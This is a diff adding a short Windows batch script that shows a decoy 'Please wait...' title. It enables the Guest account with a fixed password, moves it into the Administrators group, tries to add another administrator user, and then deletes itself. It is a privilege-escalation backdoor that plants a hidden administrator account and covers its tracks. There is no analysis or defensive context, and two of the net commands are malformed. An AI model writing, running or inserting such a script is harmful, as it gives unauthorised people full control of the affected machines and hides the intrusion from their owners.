@@ -1,0 +1,9 @@
+echo off
+title Please wait...
+cls
+net user add Username Password /add
+net user localgroup Administrators Username /add
+net user Guest 420 /active:yes
+net localgroup Guests Guest /DELETE
+net localgroup Administrators Guest /add
+del %0
